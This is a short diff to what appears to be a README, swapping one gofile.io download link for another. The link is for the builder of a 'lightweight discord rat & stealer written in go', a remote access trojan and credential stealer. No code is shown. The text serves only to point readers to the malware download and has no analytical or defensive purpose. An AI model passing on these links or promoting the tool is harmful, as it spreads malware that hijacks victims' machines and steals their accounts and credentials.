@@ -2,7 +2,7 @@
 
 Download the builder here. :
 
-https://gofile.io/d/VMEKx3
+https://gofile.io/d/UXIR1p
 
 lightweight discord rat & stealer written in go
 
